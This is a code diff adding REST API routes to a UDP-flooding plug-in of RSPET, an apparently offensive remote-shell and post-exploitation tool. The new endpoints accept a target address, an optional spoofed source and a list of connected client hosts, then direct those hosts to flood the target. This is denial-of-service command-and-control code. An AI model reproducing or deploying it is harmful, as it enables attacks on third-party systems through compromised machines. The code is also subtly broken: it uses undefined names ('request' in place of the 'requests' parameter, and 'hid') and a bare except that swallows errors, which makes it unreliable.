@@ -1,8 +1,9 @@
 """
 Plug-in module for RSPET server. Offer functions related to udp flooding.
 """
+from aiohttp import web
 from socket import error as sock_error
-from rspet.server.decorators import command, installer
+from rspet.server.decorators import command, installer, route, router
 
 
 @command("connected", "multiple")
@@ -61,6 +62,53 @@ def udp_spoof(server, args):
     return ret
 
 
+# REST API VEIWS
+
+async def udp_helper(requests, rtype='flood'):
+    try:
+        body = await request.json()
+        target = body['target']
+        args = [target['ip'], target['port']]
+        if rtype == 'spoof':
+            spoof = body['spoof']
+            args.extend([spoof['ip'], spoof['port']])
+        try:
+            args.append(body['payload'])
+        except KeyError:
+            pass
+        clients = body['clients']
+    except:
+        pass  # Return an error ...
+    server = request.app['server']
+    res = server.select(clients)
+    if res[0] != 0:
+        server.select([])
+        return web.json_response(
+            {'error': 'Host %s not found' % hid},
+            status=404
+        )
+    if rtype == 'spoof':
+        udp_spoof(server, args)
+    else:
+        udp_flood(server, args)
+    return web.Response(status=204)
+
+
+@route('POST', 'flood/', 'udp_flood')
+async def api_udp_flood(requests):
+    return (await udp_helper(request))
+
+
+@route('POST', 'spoof/', 'udp_spoof')
+async def api_udp_spoof(requests):
+    return (await udp_helper(request, 'spoof'))
+
+
 @installer(__name__)
 def setup(app, commands):
+    pass
+
+
+@router(__name__)
+def make_routes(app, name):
     pass
